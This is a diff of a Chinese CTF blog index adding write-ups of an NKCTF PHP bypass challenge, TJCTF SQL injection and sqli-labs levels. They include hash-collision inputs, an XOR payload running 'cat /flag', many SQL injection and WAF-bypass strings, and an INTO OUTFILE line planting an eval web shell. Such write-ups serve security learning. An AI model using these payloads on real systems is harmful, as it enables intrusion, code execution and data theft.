class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!!&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;error!!!!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里有很多匹配，需要将这些匹配全部都绕过，才能达到<code>eval($_POST[&#39;cmd&#39;]);</code>命令</p>
+<p>2.先看第一个</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这个可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=s1885207154a&amp;b=s1836677006a</span><br></pre></td></tr></table></figure>
+
+<p>这两个数值经过md5加密后，都是以0e开头的，以0e开头的数都等于0</p>
+<p>第二个</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>这个通过搜到资料找到可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
+
+<p>第三个</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span></span><br></pre></td></tr></table></figure>
+
+<p>intval()函数是获取变量的整数值</p>
+<p>可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=114514E13</span><br></pre></td></tr></table></figure>
+
+<p>intval()函数不会读取E后面的值，经过intval()函数处理后就等于114514</p>
+<p>第四个</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>需要存在NS_CTF.go，但是传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code></p>
+<p>所以直接传参NS_CTF.go并不能行</p>
+<p>搜索发现当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，然后因为出错，点<code>.</code>就不会变成下划线<code>_</code></p>
+<p>第五个</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>不能存在数字和字母</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);&amp;_=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>以下摆出能生成异或查询脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="built_in">input</span>(<span class="string">&quot;Input key:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        result=i^j</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(result) <span class="keyword">is</span> key ):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;(&quot;&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;&quot;^&quot;&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;&quot;)==&#x27;</span>+<span class="built_in">chr</span>(result)+<span class="string">&#x27;   chr(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)^chr(&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;)==&#x27;</span>+<span class="built_in">chr</span>(result))</span><br></pre></td></tr></table></figure>
+
+<p>例如</p>
+<p><img src="/2023/03/29/nkctf%20web/image-20230410215740449.png" alt="image-20230410215740449"></p>
 ]]></content>
   </entry>
   <entry>
@@ -1084,6 +952,60 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ez-sql-4db84472ca9db26a.tjc.tf/search?name[]=11&#x27; union select 1,flag from flag_b1af377e_0ac5_46cd_8889_fea243615ec9--</span><br></pre></td></tr></table></figure>
 
 <p>![image-20230530172147626](pay-to-win(TJCTF 2023)&#x2F;image-20230530172147626.png)</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sqli-labs关卡</title>
+    <url>/2022/11/19/sqli-labs/</url>
+    <content><![CDATA[<p>简介</p>
+<span id="more"></span>
+
+<p>数据库：security<br>表：emails,referers,uagents,users<br>列：USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>字符型 id&#x3D;’’</p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>数字型 id&#x3D;</p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>带括号的字符型 id&#x3D;(‘’)</p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>带括号的字符型 id&#x3D;(“”)</p>
+<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>字符型 id&#x3D;’’<br>需要使用布尔盲注 单引号</p>
+<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>字符型 id&#x3D;’’<br>使用布尔盲注 双引号</p>
+<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p><a href="http://localhost/sqli-labs-master/Less-7/?id=1&#39;">http://localhost/sqli-labs-master/Less-7/?id=1&#39;</a>)) union select 1,2,”<?php @eval($_POST['pass']);?>“ into outfile “E:\phpstudy\phpstudy_pro\WWW\sqli-labs-master\Less-7\pass.php”–+<br>使用文件上传</p>
+<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>字符型  id&#x3D;’’<br>使用布尔盲注</p>
+<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>时间延迟  单引号</p>
+<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>时间延迟  双引号</p>
+<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><p>post注入 字符型<br>id&#x3D;’’</p>
+<h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p>post注入<br>id&#x3D;(“”)<br>uname&#x3D;&amp;passwd&#x3D;1”) union select 1,2#&amp;submit&#x3D;Submit</p>
+<h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><p>post的报错型注入<br>使用’)</p>
+<h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><p>post的报错型注入<br>和十三关相似<br>使用”</p>
+<h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>post的时间延迟注入<br>使用’</p>
+<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h3><p>post的时间延迟注入<br>使用”）</p>
+<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>username进行了过滤  可以在password进行注入<br>先输入对的username<br>再进行报错型注入<br>使用’<br>‘and extractvalue(1,concat(0x7e,(select database()))) and’1’&#x3D;’1</p>
+<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>需要登录正确的username和password<br>username和password都存在过滤<br>去User-Agent进行注入，先将values进行闭合<br>使用报错型注入<br>User-Agent: 1’,1,updatexml(1,concat(0x5e,database()),1))#<br>或者<br>User-Agent: ‘and extractvalue(1,concat(0x7e,(select database()))) and’1’&#x3D;’1</p>
+<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>需要登录正确的username和password<br>去Referer进行注入，先将values进行闭合<br>使用报错型注入<br>Referer: 1’,updatexml(1,concat(0x5e,database()),1))#</p>
+<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>Cookie: uname&#x3D;’ union select 1,2,database()#</p>
+<h3 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>但这里有base64编码<br>原注入语句为’) union select 1,group_concat(schema_name),3 from information_schema.schemata #<br>需要进行编码为JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhICM&#x3D;<br>Cookie: uname&#x3D;’) union select 1,group_concat(schema_name),3 from information_schema.schemata #</p>
+<h3 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h3><p>需要登录正确的username和password<br>去cookie进行注入<br>使用联合注入<br>但这里有base64编码<br>原注入语句为” union select 1,group_concat(schema_name),3 from information_schema.schemata #<br>需要进行编码，和第二十一关差不多</p>
+<h3 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h3><p>过滤了注释<br>使用?id&#x3D;-1’ union select 1,database(),3 or ‘1’&#x3D;’1来获取数据库，3 or ‘1’&#x3D;’1是一体的只会返回1</p>
+<h3 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h3><p>二次注入<br>注册admin’# php会对其进行转义保存进数据库中<br>修改admin’#的密码相当于修改admin的密码此时语句变成了’admin’#’</p>
+<h3 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h3><p>将or和and过滤了<br>进行get注入<br>使用?id&#x3D;1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’–+<br>但or和and过滤，而information_schema.tables中有or需要写成infoorrmation_schema.tables</p>
+<h3 id="第二十五a关"><a href="#第二十五a关" class="headerlink" title="第二十五a关"></a>第二十五a关</h3><p>字符型<br>将or和and过滤了<br>使用get的普通注入就可以</p>
+<h3 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h3><p>使用 “%a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”<br>过滤了空格，or，and，&#x2F;<br>使用报错型注入<br>?id&#x3D;1’||updatexml(1,concat(0x7e,(SELECT(group_concat(table_name))FROM(infoorrmation_schema.tables)WHERE(table_schema&#x3D;’security’))),1)||’1’&#x3D;’1</p>
+<h3 id="第二十六a关"><a href="#第二十六a关" class="headerlink" title="第二十六a关"></a>第二十六a关</h3><p>使用布尔盲注脚本<br>空格绕过无法使用<br>无法使用报错型注入，无报错内容<br>空格，or，and，&#x2F;&#x2F;都被过滤<br><a href="http://localhost/sqli-labs-master/Less-26a/?id=1&#39;aandnd(substr((select(group_concat(0x3a,0x3a,id,username))from(users)),%d,1)=&#39;%s&#39;)aandnd&#39;1">http://localhost/sqli-labs-master/Less-26a/?id=1&#39;aandnd(substr((select(group_concat(0x3a,0x3a,id,username))from(users)),%d,1)=&#39;%s&#39;)aandnd&#39;1</a></p>
+<h3 id="第二十七关"><a href="#第二十七关" class="headerlink" title="第二十七关"></a>第二十七关</h3><p>使用单引号<br>过滤了&#x2F;<em><em>&#x2F;,#,union,select,空格<br>使用绕过<a href="http://localhost:8088/sqlilabs/Less-27/?id=0&#39;/">http://localhost:8088/sqlilabs/Less-27/?id=0&#39;/</a></em>%0a*&#x2F;UnIoN&#x2F;*%0a</em>&#x2F;SeLeCt&#x2F;<em>%0a</em>&#x2F;2,database(),4&#x2F;<em>%0a</em>&#x2F;||&#x2F;<em>%0a</em>&#x2F;‘1’&#x3D;’1<br>&#x2F;<em>%0a</em>&#x2F;强行制造空格，后面进行单引号闭合</p>
+<h3 id="第二十七a关"><a href="#第二十七a关" class="headerlink" title="第二十七a关"></a>第二十七a关</h3><p>使用双引号<br>和二十七关差不多</p>
+<p>过滤<br>1.注释符号被过滤：使用or ‘a’&#x3D;’b的方式来绕过<br>2.空格被过滤：使用%a0空格，%a0换行，%09tab键，%0c来绕过<br>3.and和or被绕过：用&amp;&amp;和||来代替<br>4.union和select被绕过：使用sElect，uniOn等来代替</p>
+<h3 id="第二十八关"><a href="#第二十八关" class="headerlink" title="第二十八关"></a>第二十八关</h3><p>union select组合被过滤，不能使用组合<br>使用<a href="http://localhost/sqli-labs-master/Less-28a/?id=a&#39;)%0aunion%0aunion%0aselectselect%0a1,2,database();%00">http://localhost/sqli-labs-master/Less-28a/?id=a&#39;)%0aunion%0aunion%0aselectselect%0a1,2,database();%00</a></p>
+<h3 id="第二十八a关"><a href="#第二十八a关" class="headerlink" title="第二十八a关"></a>第二十八a关</h3><p>和二十八关一样</p>
+<h3 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关"></a>第二十九关</h3><p>使用’<br>WAF绕过<br>在页面使用联合注入那么就和第一关一样<br>在源文件中有login.php在其中进行注入<br><a href="http://127.0.0.1/sql1/Less-29/login.php?id=1%E5%8F%AF%E4%BB%A5%E5%9B%9E%E6%98%BE">http://127.0.0.1/sql1/Less-29/login.php?id=1可以回显</a><br>使用<a href="http://127.0.0.1/sql1/Less-29/login.php?id=1&#39;%E6%98%BE%E7%A4%BA%E8%A2%ABwaf%E6%8B%A6%E4%B8%8B">http://127.0.0.1/sql1/Less-29/login.php?id=1&#39;显示被waf拦下</a><br>再使用<a href="http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=2%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87waf%E7%84%B6%E5%90%8E%E5%9B%9E%E6%98%BE">http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=2可以绕过waf然后回显</a><br>然后进行正常的注入<a href="http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=0&#39;">http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=0&#39;</a> union select 1,2,3–+</p>
+<h3 id="第三十关"><a href="#第三十关" class="headerlink" title="第三十关"></a>第三十关</h3><p>和第二十九关一样<br>使用”</p>
+<h3 id="第三十一关"><a href="#第三十一关" class="headerlink" title="第三十一关"></a>第三十一关</h3><p>和第二十九关一样<br>使用”)</p>
+<h3 id="第三十二关"><a href="#第三十二关" class="headerlink" title="第三十二关"></a>第三十二关</h3><p>GBK双字节编码：一个汉字用两个字节表示<br>宽字节绕过引号转义<br>会在’前面自动添加<br>使用%df’ php自动处理后为%df&#39;<br>%df\连接变为一个汉字，这样就可以单引号逃逸<br><a href="http://localhost/sqli-labs-master/Less-32/?id=%EF%BF%BD&#39;">http://localhost/sqli-labs-master/Less-32/?id=%df&#39;</a> union select 1,2,3–+<br>后面爆表的时候table_schema&#x3D;’数据库’  可以将’数据库’改为使用十六进制</p>
+<h3 id="第三十三关"><a href="#第三十三关" class="headerlink" title="第三十三关"></a>第三十三关</h3><p>和第三十二关一样</p>
+<h3 id="第三十四关"><a href="#第三十四关" class="headerlink" title="第三十四关"></a>第三十四关</h3><p>为post的斜杠转义，但转义方式与get型的不相同<br>uname&#x3D;%df’ union select 1,2#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit<br>不能使用hackbar，会自动将%df的%换成%25，变为%25df，post无法将其再次解码为%<br>使用burp来注入</p>
+<h3 id="第三十五关"><a href="#第三十五关" class="headerlink" title="第三十五关"></a>第三十五关</h3><p>数字型<br>直接使用联合注入<br>table_schema&#x3D;’数据库’的’数据库’使用十六进制</p>
+<h3 id="第三十六关"><a href="#第三十六关" class="headerlink" title="第三十六关"></a>第三十六关</h3><p>和第三十二关一样</p>
+<h3 id="第三十七关"><a href="#第三十七关" class="headerlink" title="第三十七关"></a>第三十七关</h3><p>和第三十五关一样</p>
+<h3 id="第三十八关"><a href="#第三十八关" class="headerlink" title="第三十八关"></a>第三十八关</h3><p>使用’<br>堆叠查询注入<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开</p>
+<h3 id="第三十九关"><a href="#第三十九关" class="headerlink" title="第三十九关"></a>第三十九关</h3><p>数字型<br>和三十八关一样</p>
+<h3 id="第四十关"><a href="#第四十关" class="headerlink" title="第四十关"></a>第四十关</h3><p>使用’)<br>可以使用联合注入也可以使用布尔盲注<br>没有报错，无法使用报错型注入</p>
 ]]></content>
   </entry>
   <entry>
@@ -1384,41 +1306,37 @@
 <h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关(?)"></a>第二十关(?)</h3>]]></content>
   </entry>
   <entry>
-    <title>php的类</title>
-    <url>/2022/11/11/%E7%B1%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
-    <content><![CDATA[<p>PHP类的基本操作</p>
+    <title>反序列化逃逸</title>
+    <url>/2022/12/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
+    <content><![CDATA[<p>字符减少型</p>
 <span id="more"></span>
 
-<h4 id="1-类的继承"><a href="#1-类的继承" class="headerlink" title="1.类的继承"></a>1.类的继承</h4><p>extends关键字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;    //创建一个human父类</span><br><span class="line">    public $name;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父亲说话的方法，姓名：&quot; . $this-&gt;name.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;父亲吃饭的方法\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;   //这里sport继承了human，sport为子类,human为父类</span><br><span class="line">    public $type;</span><br><span class="line">    public function __construct($name,$type)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;type=$type;</span><br><span class="line">    &#125;</span><br><span class="line">    public function run()&#123;</span><br><span class="line">        $this-&gt;say();</span><br><span class="line">        echo &quot;我正在跑步，我是一名&quot; . $this-&gt;type . &quot;运动员\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class host extends human&#123;  //这里host继承了human，host为子类,human为父类</span><br><span class="line">    public $tele;</span><br><span class="line">    public function __construct($name,$tele)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;tele=$tele;</span><br><span class="line">    &#125;</span><br><span class="line">    public function perform()&#123;</span><br><span class="line">        $this-&gt;eat();</span><br><span class="line">        echo &quot;我正在表演一个节目，我是&quot;.$this-&gt;tele.&quot;电视台的主持人\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$nba=new sport(&quot;乔丹&quot;,&quot;篮球&quot;);</span><br><span class="line">$nba-&gt;run();</span><br><span class="line">$tv=new host(&quot;张三&quot;,&quot;北京卫视&quot;);</span><br><span class="line">$tv-&gt;perform();</span><br></pre></td></tr></table></figure>
+<p>源码是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>
 
-<p>输出</p>
-<p>父亲说话的方法，姓名：乔丹 我正在跑步，我是一名篮球运动员 父亲吃饭的方法 我正在表演一个节目，我是北京卫视电视台的主持人</p>
-<h4 id="2-方法重写"><a href="#2-方法重写" class="headerlink" title="2.方法重写"></a>2.方法重写</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;</span><br><span class="line">    public function say()  //在子类中再次声明一个say方法，这样可以覆盖父类中的say方法</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;子类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;say();</span><br></pre></td></tr></table></figure>
+<p>刚打开有一个回显<code>object(UserAccount)#1 (2) &#123; [&quot;username&quot;:protected]=&gt; NULL [&quot;password&quot;:protected]=&gt; NULL &#125;</code></p>
+<p>看到最后有unserialize函数，可以反序列化，反序列化前还有自定义的函数<code>object_weakup</code>和<code>object_sleep</code>会起作用，看着两个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function object_sleep($str)</span><br><span class="line">&#123;</span><br><span class="line">    $ob = str_replace(&#x27;a*a&#x27;, &#x27;@0@0@0@0@&#x27;, $str);</span><br><span class="line">    return $ob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function object_weakup($ob)</span><br><span class="line">&#123;</span><br><span class="line">    $r = str_replace(&#x27;@0@0@0@0@&#x27;, &#x27;a*a&#x27;, $ob);</span><br><span class="line">    return $r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>输出   子类说话的方法</p>
-<h4 id="3-访问控制"><a href="#3-访问控制" class="headerlink" title="3.访问控制"></a>3.访问控制</h4><p>public关键字:定义公共的成员属性或方法，任何地方都可使用</p>
-<p>protected关键字:定义受保护的成员属性或方法，只允许类本身或子类使用</p>
